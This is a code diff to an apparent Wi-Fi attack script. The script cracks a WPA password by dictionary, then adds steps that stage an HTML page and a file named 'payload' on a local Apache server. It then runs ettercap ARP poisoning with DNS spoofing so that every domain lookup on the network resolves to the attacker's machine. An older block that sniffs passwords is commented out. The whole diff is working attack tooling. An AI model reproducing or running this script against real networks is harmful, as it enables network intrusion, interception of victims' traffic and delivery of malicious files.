@@ -44,9 +44,18 @@ def getMachineIPAddress():
 
 def ettercapConfiguration(ip_address):
     with open("/etc/ettercap/etter.dns", "w+") as etter:
-        etter.write("* A {}".format(ip_address))
+        etter.write("* A {}\n".format(ip_address))
         etter.write("* PTR {}".format(ip_address))
-    
+
+def startApache():
+    os.system("cp index.html /var/www/html/")
+    os.system("cp wifi.png /var/www/html/")
+    os.system("cp payload /var/www/html/")
+    os.system("cp connect.png /var/www/html/")
+    os.system("apache2ctl start")
+
+def startDNSSpoofing():
+    os.system("ettercap -i eth0 -T -q -P dns_spoof -M ARP:remote")
 
 def arpPoison(interface_name, host):
     arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -60,8 +69,9 @@ if __name__ == "__main__":
     essid = input("Enter the name of the network you'd like to attack:")
     password = crackWPA(essid, DICT_FILE)
     connectToNetwork()
+    #password = "praetorian"
     input("Password found! Connect to '{}' with password '{}' and press enter when ready".format(essid, password))
-    print("ARP Poisoning...")
+    print("ARP Poisoning and redirecting...")
 
     # ettercap
     ip = getMachineIPAddress()
@@ -69,9 +79,12 @@ if __name__ == "__main__":
     # ettercap
 
     gatewayIP = getGatewayIP()
-    arpSpoofProc = arpPoison(INTERFACE_NAME, gatewayIP)
-    print("Sniffing passwords...")
-    sniffProc = sniffPasswords()
-    input("Press enter to stop sniffing")
-    sniffProc.terminate()
-    arpSpoofProc.terminate()
+    startApache()
+    startDNSSpoofing()
+    #arpSpoofProc = arpPoison(INTERFACE_NAME, gatewayIP)
+    #print("Sniffing passwords...")
+    #sniffProc = sniffPasswords()
+    #input("Press enter to stop sniffing")
+    #sniffProc.terminate()
+    #arpSpoofProc.terminate()
+
